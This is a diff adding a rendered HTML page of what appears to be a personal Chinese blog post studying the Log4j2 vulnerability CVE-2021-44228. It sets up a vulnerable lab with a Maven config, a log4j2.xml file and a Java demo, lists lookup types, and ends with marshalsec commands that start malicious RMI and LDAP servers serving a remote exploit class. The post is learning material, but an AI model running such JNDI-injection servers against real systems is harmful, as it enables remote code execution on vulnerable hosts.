@@ -1,0 +1,572 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="en-us">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>Log4j2漏洞学习 - 6s6&#39;s blog</title><meta name="author" content="6s6">
+<meta name="description" content="description is here"><meta name="keywords" content='Java'>
+  <meta itemprop="name" content="Log4j2漏洞学习">
+  <meta itemprop="description" content="description is here">
+  <meta itemprop="datePublished" content="2025-04-13T18:50:55+08:00">
+  <meta itemprop="dateModified" content="2025-04-13T18:50:55+08:00">
+  <meta itemprop="wordCount" content="642">
+  <meta itemprop="keywords" content="Java"><meta property="og:url" content="http://localhost:1313/posts/cde7a8a/">
+  <meta property="og:site_name" content="6s6&#39;s blog">
+  <meta property="og:title" content="Log4j2漏洞学习">
+  <meta property="og:description" content="description is here">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-04-13T18:50:55+08:00">
+    <meta property="article:modified_time" content="2025-04-13T18:50:55+08:00">
+    <meta property="article:tag" content="Java">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Log4j2漏洞学习">
+  <meta name="twitter:description" content="description is here">
+<meta name="application-name" content="FixIt">
+<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" type="text/html" href="http://localhost:1313/posts/cde7a8a/" title="Log4j2漏洞学习 - 6s6&#39;s blog" /><link rel="prev" type="text/html" href="http://localhost:1313/posts/28dc684/" title="CodeQL入门" /><link rel="alternate" type="text/markdown" href="http://localhost:1313/posts/cde7a8a/index.md" title="Log4j2漏洞学习 - 6s6's blog"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "Log4j2漏洞学习",
+    "inLanguage": "en-us",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "http:\/\/localhost:1313\/posts\/cde7a8a\/"
+    },"genre": "posts","keywords": "Java","wordcount":  642 ,
+    "url": "http:\/\/localhost:1313\/posts\/cde7a8a\/","datePublished": "2025-04-13T18:50:55+08:00","dateModified": "2025-04-13T18:50:55+08:00","publisher": {
+      "@type": "Organization",
+      "name": ""},"author": {
+        "@type": "Person",
+        "name": "6s6"
+      },"description": ""
+  }
+  </script><script src="/js/head/color-scheme.min.js"></script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="6s6&#39;s blog"><span class="typeit"><template>6s6&#39;s blog</template></span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a class="menu-link" href="/posts/">Posts</a></li><li class="menu-item">
+              <a class="menu-link" href="/categories/">Categories</a></li><li class="menu-item">
+              <a class="menu-link" href="/tags/">Tags</a></li><li class="menu-item">
+              <a class="menu-link" href="/links/" title="links">Links</a></li><li class="menu-item">
+              <a class="menu-link" href="/about/">About</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
+            <input type="text" placeholder="搜索文章标题或内容……" id="search-input-desktop">
+            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+            </a>
+            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+            </a>
+            <span class="search-button search-loading" id="search-loading-desktop">
+              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+            </span>
+          </li><li class="menu-item theme-switch" title="切换主题">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="6s6&#39;s blog"><span class="typeit"><template>6s6&#39;s blog</template></span></a><span class="header-subtitle"></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
+            <div class="search mobile" id="search-mobile">
+              <input type="text" placeholder="搜索文章标题或内容……" id="search-input-mobile">
+              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+              </a>
+              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+              </a>
+              <span class="search-button search-loading" id="search-loading-mobile">
+                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+              </span>
+            </div>
+            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+              取消
+            </a>
+          </li><li class="menu-item"><a class="menu-link" href="/posts/">Posts</a></li><li class="menu-item"><a class="menu-link" href="/categories/">Categories</a></li><li class="menu-item"><a class="menu-link" href="/tags/">Tags</a></li><li class="menu-item"><a class="menu-link" href="/links/" title="links">Links</a></li><li class="menu-item"><a class="menu-link" href="/about/">About</a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="切换主题"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
+      </ul>
+    </nav>
+  </div>
+</header><div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+  </div>
+  <div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+  </div><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="合集"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>Log4j2漏洞学习</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="https://bu.dusays.com/2024/12/26/676d23907280d.jpg" alt="6s6" data-title="6s6" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;6s6</span></span><span class="post-included-in">&nbsp;收录于 <a href="/categories/java/" class="post-category" title="分类 - Java"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> Java</a></span></div><div class="post-meta-line"><span title="发布于 2025-04-13 18:50:55"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2025-04-13">2025-04-13</time></span>&nbsp;<span title="642 字"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>约 700 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>预计阅读 4 分钟</span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>目录</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#前言">前言</a></li>
+    <li><a href="#简介">简介</a></li>
+    <li><a href="#影响版本">影响版本</a></li>
+    <li><a href="#环境搭建">环境搭建</a></li>
+    <li><a href="#漏洞分析">漏洞分析</a></li>
+    <li><a href="#绕过其防御">绕过其防御</a></li>
+    <li><a href="#总结">总结</a></li>
+    <li><a href="#参考">参考</a></li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content"><h2 id="log4j2cve-2021-44228" class="heading-element"><span>Log4j2（CVE-2021-44228）</span>
+  <a href="#log4j2cve-2021-44228" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><h2 id="前言" class="heading-element"><span>前言</span>
+  <a href="#%e5%89%8d%e8%a8%80" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>没学 java 就知道这个漏洞，应该还有不少的解析和绕过，这里就简单先了解下最基础的</p>
+<h2 id="简介" class="heading-element"><span>简介</span>
+  <a href="#%e7%ae%80%e4%bb%8b" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>log4j2是apache下的java应用常见的开源日志库，是一个就Java的日志记录工具。在log4j框架的基础上进行了改进，并引入了丰富的特性，可以控制日志信息输送的目的地为控制台、文件、GUI组建等，被应用于业务系统开发，用于记录程序输入输出日志信息。</p>
+<p>其被广泛应用于业务系统开发，开发者可以利用该工具将程序的输入输出信息进行日志记录。在java中最常用的日志框架是log4j2和logback，其中log4j2支持lookup功能（看到这个就知道要打 jndi ）。例如当开发者想在日志中打印今天的日期，则只需要输出<code>${data:MM-dd-yyyy}</code>，此时log4j会将${}中包裹的内容单独处理，将它识别为日期查找，然后将该表达式替换为今天的日期内容输出为“08-22-2022”，这样做就不需要开发者自己去编写查找日期的代码。究其根本，还是最后调用触发了 jndi</p>
+<h2 id="影响版本" class="heading-element"><span>影响版本</span>
+  <a href="#%e5%bd%b1%e5%93%8d%e7%89%88%e6%9c%ac" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>2.0 &lt;= Apache log4j2 &lt;= 2.14.1</p>
+<h2 id="环境搭建" class="heading-element"><span>环境搭建</span>
+  <a href="#%e7%8e%af%e5%a2%83%e6%90%ad%e5%bb%ba" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>pom.xml</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">      &lt;dependency&gt;
+</span></span><span class="line"><span class="cl">        &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;
+</span></span><span class="line"><span class="cl">        &lt;artifactId&gt;log4j-core&lt;/artifactId&gt;
+</span></span><span class="line"><span class="cl">        &lt;version&gt;2.14.1&lt;/version&gt;
+</span></span><span class="line"><span class="cl">      &lt;/dependency&gt;
+</span></span><span class="line"><span class="cl">      &lt;dependency&gt;
+</span></span><span class="line"><span class="cl">        &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;
+</span></span><span class="line"><span class="cl">        &lt;artifactId&gt;log4j-api&lt;/artifactId&gt;
+</span></span><span class="line"><span class="cl">        &lt;version&gt;2.14.1&lt;/version&gt;
+</span></span><span class="line"><span class="cl">      &lt;/dependency&gt;
+</span></span><span class="line"><span class="cl">      &lt;dependency&gt;
+</span></span><span class="line"><span class="cl">        &lt;groupId&gt;junit&lt;/groupId&gt;
+</span></span><span class="line"><span class="cl">        &lt;artifactId&gt;junit&lt;/artifactId&gt;
+</span></span><span class="line"><span class="cl">        &lt;version&gt;4.12&lt;/version&gt;
+</span></span><span class="line"><span class="cl">        &lt;scope&gt;test&lt;/scope&gt;
+</span></span><span class="line"><span class="cl">      &lt;/dependency&gt;</span></span></code></pre></td></tr></table>
+</div>
+</div><p>再写个xml文件来实现log4j2（yaml等文件也行），默认文件名为log4j2.xml，放在 <code>src/main/resources</code> 目录下</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;  
+</span></span><span class="line"><span class="cl">&lt;!-- log4j2 配置文件 --&gt;  
+</span></span><span class="line"><span class="cl">&lt;!-- 日志级别 trace&lt;debug&lt;info&lt;warn&lt;error&lt;fatal --&gt;&lt;configuration status=&#34;info&#34;&gt;  
+</span></span><span class="line"><span class="cl">    &lt;!-- 自定义属性 --&gt;  
+</span></span><span class="line"><span class="cl">    &lt;Properties&gt;  
+</span></span><span class="line"><span class="cl">        &lt;!-- 日志格式(控制台) --&gt;  
+</span></span><span class="line"><span class="cl">        &lt;Property name=&#34;pattern1&#34;&gt;[%-5p] %d %c - %m%n&lt;/Property&gt;  
+</span></span><span class="line"><span class="cl">        &lt;!-- 日志格式(文件) --&gt;  
+</span></span><span class="line"><span class="cl">        &lt;Property name=&#34;pattern2&#34;&gt;  
+</span></span><span class="line"><span class="cl">            =========================================%n 日志级别：%p%n 日志时间：%d%n 所属类名：%c%n 所属线程：%t%n 日志信息：%m%n  
+</span></span><span class="line"><span class="cl">        &lt;/Property&gt;  
+</span></span><span class="line"><span class="cl">        &lt;!-- 日志文件路径 --&gt;  
+</span></span><span class="line"><span class="cl">        &lt;Property name=&#34;filePath&#34;&gt;logs/myLog.log&lt;/Property&gt;  
+</span></span><span class="line"><span class="cl">    &lt;/Properties&gt;    &lt;appenders&gt; &lt;Console name=&#34;Console&#34; target=&#34;SYSTEM_OUT&#34;&gt;  
+</span></span><span class="line"><span class="cl">        &lt;PatternLayout pattern=&#34;${pattern1}&#34;/&gt;  
+</span></span><span class="line"><span class="cl">    &lt;/Console&gt; &lt;RollingFile name=&#34;RollingFile&#34; fileName=&#34;${filePath}&#34;  
+</span></span><span class="line"><span class="cl">                            filePattern=&#34;logs/$${date:yyyy-MM}/app-%d{MM-dd-yyyy}-%i.log.gz&#34;&gt;  
+</span></span><span class="line"><span class="cl">        &lt;PatternLayout pattern=&#34;${pattern2}&#34;/&gt;  
+</span></span><span class="line"><span class="cl">        &lt;SizeBasedTriggeringPolicy size=&#34;5 MB&#34;/&gt;  
+</span></span><span class="line"><span class="cl">    &lt;/RollingFile&gt; &lt;/appenders&gt; &lt;loggers&gt; &lt;root level=&#34;info&#34;&gt;  
+</span></span><span class="line"><span class="cl">    &lt;appender-ref ref=&#34;Console&#34;/&gt;  
+</span></span><span class="line"><span class="cl">    &lt;appender-ref ref=&#34;RollingFile&#34;/&gt;  
+</span></span><span class="line"><span class="cl">&lt;/root&gt; &lt;/loggers&gt;&lt;/configuration&gt;</span></span></code></pre></td></tr></table>
+</div>
+</div><p>最后写个demo来触发</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="line"><span class="cl"><span class="kn">package</span> <span class="nx">com</span><span class="p">.</span><span class="nx">example</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nx">org</span><span class="p">.</span><span class="nx">apache</span><span class="p">.</span><span class="nx">logging</span><span class="p">.</span><span class="nx">log4j</span><span class="p">.</span><span class="nx">LogManager</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nx">org</span><span class="p">.</span><span class="nx">apache</span><span class="p">.</span><span class="nx">logging</span><span class="p">.</span><span class="nx">log4j</span><span class="p">.</span><span class="nx">Logger</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nx">java</span><span class="p">.</span><span class="nx">util</span><span class="p">.</span><span class="nx">function</span><span class="p">.</span><span class="nx">LongFunction</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">public</span> <span class="nx">class</span> <span class="nx">test</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">public</span> <span class="nx">static</span> <span class="nx">void</span> <span class="nf">main</span><span class="p">(</span><span class="nx">String</span><span class="p">[]</span> <span class="nx">args</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">Logger</span> <span class="nx">logger</span> <span class="p">=</span> <span class="nx">LogManager</span><span class="p">.</span><span class="nf">getLogger</span><span class="p">(</span><span class="nx">LongFunction</span><span class="p">.</span><span class="nx">class</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="nx">String</span> <span class="nx">username</span> <span class="p">=</span> <span class="s">&#34;admin123&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">username</span> <span class="o">!=</span> <span class="nx">null</span> <span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">logger</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="s">&#34;User {} login in!&#34;</span><span class="p">,</span> <span class="nx">username</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">logger</span><span class="p">.</span><span class="nb">error</span><span class="p">(</span><span class="s">&#34;User {} not exists&#34;</span><span class="p">,</span> <span class="nx">username</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>可以看到是将登录信息记录到了 myLog.log 中</p>
+<p><img loading="lazy" src="https://bu.dusays.com/2025/04/13/67fb712398209.png" alt="image-20250413160907762" srcset="https://bu.dusays.com/2025/04/13/67fb712398209.png?size=small, https://bu.dusays.com/2025/04/13/67fb712398209.png?size=medium 1.5x, https://bu.dusays.com/2025/04/13/67fb712398209.png?size=large 2x" data-title="image-20250413160907762" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>上面说过了 log4j2 会把 <code>${}</code> 包裹的进行特殊处理，最后会触发 lookup，以下是一些常见的 lookup 类型</p>
+<ol>
+<li>${date}：获取当前日期和时间，支持自定义格式。</li>
+<li>${pid}：获取当前进程的 ID。</li>
+<li>${logLevel}：获取当前日志记录的级别。</li>
+<li>${sys:propertyName}：获取系统属性的值，例如 ${sys:user.home} 获取用户主目录。</li>
+<li>${env:variableName}：获取环境变量的值，例如 ${env:JAVA_HOME} 获取 Java 安装路径。</li>
+<li>${ctx:key}：获取日志线程上下文（ThreadContext）中指定键的值。</li>
+<li>${class:fullyQualifiedName:methodName}：获取指定类的静态方法的返回值。</li>
+<li>${mdc:key}：获取 MDC (Mapped Diagnostic Context) 中指定键的值。</li>
+</ol>
+<p>比如 <code>${date}</code></p>
+<p><img loading="lazy" src="https://bu.dusays.com/2025/04/13/67fb972fd294c.png" alt="image-20250413161921428" srcset="https://bu.dusays.com/2025/04/13/67fb972fd294c.png?size=small, https://bu.dusays.com/2025/04/13/67fb972fd294c.png?size=medium 1.5x, https://bu.dusays.com/2025/04/13/67fb972fd294c.png?size=large 2x" data-title="image-20250413161921428" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<h2 id="漏洞分析" class="heading-element"><span>漏洞分析</span>
+  <a href="#%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>先打下，用marshalsec起个恶意的rmi服务</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &#34;http://127.0.0.1:9999/#exp&#34; 9991</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img loading="lazy" src="https://bu.dusays.com/2025/04/13/67fb972fd67cf.png" alt="image-20250413163110389" srcset="https://bu.dusays.com/2025/04/13/67fb972fd67cf.png?size=small, https://bu.dusays.com/2025/04/13/67fb972fd67cf.png?size=medium 1.5x, https://bu.dusays.com/2025/04/13/67fb972fd67cf.png?size=large 2x" data-title="image-20250413163110389" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>ldap 也是这样</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &#34;http://127.0.0.1:9999/#exp&#34; 1099</span></span></code></pre></td></tr></table>
+</div>
